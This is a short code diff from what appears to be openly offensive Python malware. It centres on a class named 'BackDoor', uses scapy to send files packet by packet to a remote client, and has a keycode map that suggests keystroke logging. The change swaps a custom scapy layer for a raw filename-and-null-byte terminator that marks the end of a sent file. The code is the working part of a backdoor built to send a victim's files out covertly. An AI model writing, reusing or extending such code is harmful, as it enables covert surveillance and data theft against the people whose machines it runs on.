@@ -20,15 +20,6 @@ from watchdog.events import FileSystemEventHandler
 from typing import List
 
 
-class FileInfo(Packet):
-    name = "FileInfo"
-    fields_desc = [
-        StrField("filename", "")
-    ]
-
-
-bind_layers(TCP, FileInfo)
-
 key_code_map = {
     0: '',
     1: ' <ESC> ',
@@ -271,8 +262,8 @@ class BackDoor:
             packets.append(packet)
 
         # Add packet to specify end of file
-        packet = IP(dst=self.client) / TCP(sport=self.src_port, dport=self.send_port) \
-                 / FileInfo(filename=name) / Raw(load=b'\x00')
+        terminator = name.encode() + b'\x00'
+        packet = IP(dst=self.client) / TCP(sport=self.src_port, dport=self.send_port) / Raw(load=terminator)
         packets.append(packet)
         self.send_pkt(packets)
 
